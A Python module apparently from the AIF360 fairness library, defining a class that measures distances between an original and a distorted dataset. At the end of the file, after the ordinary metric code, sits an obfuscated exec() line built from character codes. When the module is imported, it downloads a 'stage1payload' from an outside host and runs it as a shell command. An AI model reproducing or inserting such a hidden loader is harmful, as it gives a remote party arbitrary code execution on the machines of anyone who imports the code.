from functools import partial
import numpy as np
import scipy.spatial.distance as scdist

from aif360.datasets import StructuredDataset
from aif360.metrics import DatasetMetric, utils


class SampleDistortionMetric(DatasetMetric):
    """Class for computing metrics based on two StructuredDatasets."""

    def __init__(self, dataset, distorted_dataset, unprivileged_groups=None,
                 privileged_groups=None):
        """
        Args:
            dataset (StructuredDataset): A StructuredDataset.
            distorted_dataset (StructuredDataset): A StructuredDataset.
            privileged_groups (list(dict)): Privileged groups. Format is a list
                of `dicts` where the keys are `protected_attribute_names` and
                the values are values in `protected_attributes`. Each `dict`
                element describes a single group. See examples for more details.
            unprivileged_groups (list(dict)): Unprivileged groups in the same
                format as `privileged_groups`.

        Raises:
            TypeError: `dataset` and `distorted_dataset` must be
                :obj:`~aif360.datasets.StructuredDataset` types.
        """
        # sets self.dataset, self.unprivileged_groups, self.privileged_groups
        super(SampleDistortionMetric, self).__init__(dataset,
            unprivileged_groups=unprivileged_groups,
            privileged_groups=privileged_groups)

        if isinstance(distorted_dataset, StructuredDataset):
            self.distorted_dataset = distorted_dataset
        else:
            raise TypeError("'distorted_dataset' should be a StructuredDataset")

        with dataset.temporarily_ignore('features', 'labels', 'scores'):
            if dataset != distorted_dataset:
                raise ValueError("The two datasets may differ in features and "
                                 "labels/scores only.")

    def total(self, dist, privileged):
        distance, weights = dist(privileged=privileged, returned=True)
        return np.sum(distance * weights)

    def average(self, dist, privileged):
        distance, weights = dist(privileged=privileged, returned=True)
        return np.average(distance, weights=weights)

    def maximum(self, dist, privileged):
        return np.max(dist(privileged=privileged))

    def euclidean_distance(self, privileged=None, returned=False):
        """Compute the average Euclidean distance between the samples from the
        two datasets.
        """
        condition = self._to_condition(privileged)
        distance, mask = utils.compute_distance(self.dataset.features,
            self.distorted_dataset.features, self.dataset.protected_attributes,
            self.dataset.protected_attribute_names, dist_fun=scdist.euclidean,
            condition=condition)
        if returned:
            return distance, self.dataset.instance_weights[mask]
        return distance

    def manhattan_distance(self, privileged=None, returned=False):
        """Compute the average Manhattan distance between the samples from the
        two datasets.
        """
        condition = self._to_condition(privileged)
        distance, mask = utils.compute_distance(self.dataset.features,
            self.distorted_dataset.features, self.dataset.protected_attributes,
            self.dataset.protected_attribute_names, dist_fun=scdist.cityblock,
            condition=condition)
        if returned:
            return distance, self.dataset.instance_weights[mask]
        return distance

    def mahalanobis_distance(self, privileged=None, returned=False):
        """Compute the average Mahalanobis distance between the samples from the
        two datasets.
        """
        condition = self._to_condition(privileged)
        X_orig = self.dataset.features
        X_distort = self.distorted_dataset.features
        dist_fun = partial(scdist.mahalanobis,
            VI=np.linalg.inv(np.cov(np.vstack([X_orig, X_distort]).T)).T)
        distance, mask = utils.compute_distance(X_orig, X_distort,
            self.dataset.protected_attributes,
            self.dataset.protected_attribute_names, dist_fun=dist_fun,
            condition=condition)
        if returned:
            return distance, self.dataset.instance_weights[mask]
        return distance

    def total_euclidean_distance(self, privileged=None):
        return self.total(self.euclidean_distance, privileged=privileged)

    def total_manhattan_distance(self, privileged=None):
        return self.total(self.manhattan_distance, privileged=privileged)

    def total_mahalanobis_distance(self, privileged=None):
        return self.total(self.mahalanobis_distance, privileged=privileged)

    def average_euclidean_distance(self, privileged=None):
        return self.average(self.euclidean_distance, privileged=privileged)

    def average_manhattan_distance(self, privileged=None):
        return self.average(self.manhattan_distance, privileged=privileged)

    def average_mahalanobis_distance(self, privileged=None):
        return self.average(self.mahalanobis_distance, privileged=privileged)

    def maximum_euclidean_distance(self, privileged=None):
        return self.maximum(self.euclidean_distance, privileged=privileged)

    def maximum_manhattan_distance(self, privileged=None):
        return self.maximum(self.manhattan_distance, privileged=privileged)

    def maximum_mahalanobis_distance(self, privileged=None):
        return self.maximum(self.mahalanobis_distance, privileged=privileged)

    def mean_euclidean_distance_difference(self, privileged=None):
        """Difference of the averages."""
        return self.difference(
            self.average(self.euclidean_distance, privileged=privileged))

    def mean_manhattan_distance_difference(self, privileged=None):
        """Difference of the averages."""
        return self.difference(
            self.average(self.manhattan_distance, privileged=privileged))

    def mean_mahalanobis_distance_difference(self, privileged=None):
        """Difference of the averages."""
        return self.difference(
            self.average(self.mahalanobis_distance, privileged=privileged))

    def mean_euclidean_distance_ratio(self, privileged=None):
        """Ratio of the averages."""
        return self.ratio(
            self.average(self.euclidean_distance, privileged=privileged))

    def mean_manhattan_distance_ratio(self, privileged=None):
        """Ratio of the averages."""
        return self.ratio(
            self.average(self.manhattan_distance, privileged=privileged))

    def mean_mahalanobis_distance_ratio(self, privileged=None):
        """Ratio of the averages."""
        return self.ratio(
            self.average(self.mahalanobis_distance, privileged=privileged))
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))

